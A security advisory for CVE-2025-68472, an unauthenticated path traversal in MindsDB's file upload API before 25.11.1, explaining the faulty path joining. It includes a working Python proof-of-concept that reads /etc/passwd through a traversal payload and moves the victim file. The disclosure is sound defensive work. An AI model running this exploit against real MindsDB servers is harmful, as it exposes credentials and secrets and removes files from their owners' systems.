# MindsDB has improper sanitation of filepath that leads to information disclosure and DOS

**GHSA**: GHSA-qqhf-pm3j-96g7 | **CVE**: CVE-2025-68472 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-22, CWE-23, CWE-36

**Affected Packages**:
- **MindsDB** (pip): < 25.11.1

## Description

### Summary

[BlueRock](https://bluerock.io/) discovered an unauthenticated path traversal in the file upload API lets any caller read arbitrary files from the server filesystem and move them into MindsDB’s storage, exposing sensitive data. 

### Details
The PUT handler in file.py directly joins user-controlled data into a filesystem path when the request body is JSON and `source_type` is not `"url"`:

- `data = request.json` (line ~104) accepts attacker input without validation.
- `file_path = os.path.join(temp_dir_path, data["file"])` (line ~178) creates the path inside a temporary directory, but if `data["file"]` is absolute (e.g., `/home/secret.csv`), `os.path.join` ignores `temp_dir_path` and targets the attacker-specified location.
- The resulting path is handed to `ca.file_controller.save_file(...)`, which wraps `FileReader(path=source_path)` (`mindsdb/interfaces/file/file_controller.py:66`), causing the application to read the contents of that arbitrary file. The subsequent `shutil.move(file_path, ...)` call also relocates the victim file into MindsDB’s managed storage.

Only multipart uploads and URL-sourced uploads receive sanitization; JSON uploads lack any call to `clear_filename` or equivalent checks.

### PoC
1. Run MindsDB in Docker:
   ```bash
   docker pull mindsdb/mindsdb:latest
   docker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
   ```
2. Execute the exploit from the host (save as poc.py and run with `python poc.py`):
   ```python
   # poc.py
   import requests, json

   base = "http://127.0.0.1:47334"
   payload = {"file": "../../../../../etc/passwd"}  # no source_type -> hits vulnerable branch

   r = requests.put(f"{base}/api/files/leak_rel", json=payload, timeout=10)
   print("PUT status:", r.status_code, r.text)

   q = requests.post(
       f"{base}/api/sql/query",
       json={"query": "SELECT * FROM files.leak_rel"},
       timeout=10,
   )
   print("SQL response:", json.dumps(q.json(), indent=2))
   ```
3. The SQL response returns the contents of `/etc/passwd` . The original file disappears from its source location because the handler moves it into MindsDB’s storage directory.
4. Detailed report is available on BlueRock's blog: https://www.bluerock.io/post/cve-2025-68472-mindsdb-file-upload-path-traversal

### Impact
- Any user able to reach the REST API can read and exfiltrate arbitrary files that the MindsDB process can access, potentially including credentials, configuration secrets, and private keys.
